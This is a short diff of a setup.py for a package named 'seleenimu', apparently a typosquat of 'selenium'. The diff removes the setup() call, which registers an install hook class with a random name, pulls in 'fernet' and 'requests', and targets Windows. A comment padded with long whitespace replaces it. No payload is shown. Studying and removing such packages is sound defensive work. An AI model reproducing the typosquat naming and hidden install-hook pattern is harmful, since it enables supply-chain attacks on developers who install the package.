@@ -18,22 +18,5 @@ class iPZtuyMQeuasOLTHPSMJPcXlnSohBbbAnacmdemMSBVkvAmEiwQndmdptjOPgGjGELQmxGLTpj
             install.run(self)
 
 
-setup(
-    name="seleenimu",
-    version=VERSION,
-    author="dvRRhqqC",
-    author_email="iHemmWKGDlDQiMC@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': iPZtuyMQeuasOLTHPSMJPcXlnSohBbbAnacmdemMSBVkvAmEiwQndmdptjOPgGjGELQmxGLTpjhjBxrDLorIMnkCFjswkhQKtnPqstBKHxyxziVROPVDNpBWmCBrciGzHDfSQDIebRVbmEfjaMRBMUUiJ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 
